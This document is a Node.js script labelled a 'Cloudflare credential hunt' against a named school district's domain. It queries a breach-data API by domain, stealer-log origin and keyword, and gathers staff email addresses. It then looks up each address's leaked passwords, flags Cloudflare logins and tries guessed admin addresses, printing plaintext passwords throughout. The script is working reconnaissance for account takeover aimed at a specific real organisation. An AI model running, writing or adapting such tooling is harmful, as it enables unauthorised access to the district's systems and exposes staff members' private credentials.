import dotenv from "dotenv";
import { resolve } from "path";

dotenv.config({ path: resolve(process.cwd(), ".env") });

const LEAKCHECK_API_KEY = process.env.LEAKCHECK_API_KEY;
if (!LEAKCHECK_API_KEY) {
  console.error("Missing LEAKCHECK_API_KEY");
  process.exit(1);
}

const BASE = "https://leakcheck.io/api/v2/query";

async function searchLeakCheck(query, type) {
  const url = `${BASE}/${encodeURIComponent(query)}?type=${type}&limit=100`;
  try {
    const resp = await fetch(url, {
      headers: { "X-API-Key": LEAKCHECK_API_KEY, "Accept": "application/json" },
    });
    const data = await resp.json();
    return data;
  } catch (err) {
    return { error: err.message };
  }
}

async function main() {
  console.log("═══════════════════════════════════════════════════════");
  console.log("  CLOUDFLARE CREDENTIAL HUNT: hiawathaschools.org");
  console.log("═══════════════════════════════════════════════════════");

  // 1. Search by domain
  console.log("\n─── Search 1: Domain hiawathaschools.org ───");
  const domainResult = await searchLeakCheck("hiawathaschools.org", "domain");
  console.log(`Found: ${domainResult.result?.length || 0} records`);
  if (domainResult.result?.length > 0) {
    for (const r of domainResult.result) {
      console.log(`  Email: ${r.email || "N/A"} | Pass: ${r.password || r.hash || "N/A"} | Source: ${r.source?.name || "N/A"}`);
    }
  }

  // 2. Search by origin (stealer logs that visited hiawathaschools.org)
  console.log("\n─── Search 2: Origin hiawathaschools.org (stealer logs) ───");
  const originResult = await searchLeakCheck("hiawathaschools.org", "origin");
  console.log(`Found: ${originResult.result?.length || 0} records`);
  if (originResult.result?.length > 0) {
    for (const r of originResult.result.slice(0, 30)) {
      console.log(`  Email: ${r.email || r.username || "N/A"} | Pass: ${r.password || "N/A"} | Origin: ${r.origin || "N/A"} | Source: ${r.source?.name || "N/A"}`);
    }
  }

  // 3. Search for cloudflare.com stealer logs with hiawathaschools context
  console.log("\n─── Search 3: Cloudflare stealer logs (origin: dash.cloudflare.com) ───");
  // We need to find people who logged into cloudflare.com and also have connection to hiawathaschools
  // First get all emails from domain search, then check if any have cloudflare credentials
  const emails = new Set();
  if (domainResult.result) {
    for (const r of domainResult.result) {
      if (r.email) emails.add(r.email);
    }
  }
  if (originResult.result) {
    for (const r of originResult.result) {
      if (r.email) emails.add(r.email);
    }
  }
  
  console.log(`\nUnique emails found: ${emails.size}`);
  for (const email of emails) {
    console.log(`  - ${email}`);
  }

  // 4. For each email, search for their credentials (especially cloudflare-related)
  if (emails.size > 0) {
    console.log("\n─── Search 4: Full credential search for each email ───");
    for (const email of emails) {
      console.log(`\n  Searching: ${email}`);
      const emailResult = await searchLeakCheck(email, "email");
      if (emailResult.result?.length > 0) {
        for (const r of emailResult.result) {
          const origin = r.origin || "";
          const isCloudflare = origin.includes("cloudflare");
          const marker = isCloudflare ? "🎯 CLOUDFLARE" : "";
          console.log(`    ${marker} Pass: ${r.password || r.hash || "N/A"} | Origin: ${origin || "N/A"} | Source: ${r.source?.name || "N/A"}`);
        }
      } else {
        console.log(`    No results`);
      }
      // Rate limit
      await new Promise(r => setTimeout(r, 1500));
    }
  }

  // 5. Also search for common admin emails
  console.log("\n─── Search 5: Common admin email patterns ───");
  const adminPatterns = [
    "admin@hiawathaschools.org",
    "webmaster@hiawathaschools.org",
    "it@hiawathaschools.org",
    "tech@hiawathaschools.org",
    "info@hiawathaschools.org",
  ];
  for (const email of adminPatterns) {
    const result = await searchLeakCheck(email, "email");
    if (result.result?.length > 0) {
      console.log(`\n  ${email}: ${result.result.length} records`);
      for (const r of result.result) {
        console.log(`    Pass: ${r.password || r.hash || "N/A"} | Origin: ${r.origin || "N/A"} | Source: ${r.source?.name || "N/A"}`);
      }
    } else {
      console.log(`  ${email}: 0 records`);
    }
    await new Promise(r => setTimeout(r, 1500));
  }

  // 6. Search for cloudflare.com origin with hiawathaschools keyword
  console.log("\n─── Search 6: Keyword 'hiawatha' in stealer logs ───");
  const kwResult = await searchLeakCheck("hiawatha", "keyword");
  console.log(`Found: ${kwResult.result?.length || 0} records`);
  if (kwResult.result?.length > 0) {
    for (const r of kwResult.result.slice(0, 20)) {
      console.log(`  Email: ${r.email || r.username || "N/A"} | Pass: ${r.password || "N/A"} | Origin: ${r.origin || "N/A"}`);
    }
  }

  console.log("\n═══════════════════════════════════════════════════════");
  console.log("  SEARCH COMPLETE");
  console.log("═══════════════════════════════════════════════════════");
}

main().catch(console.error);
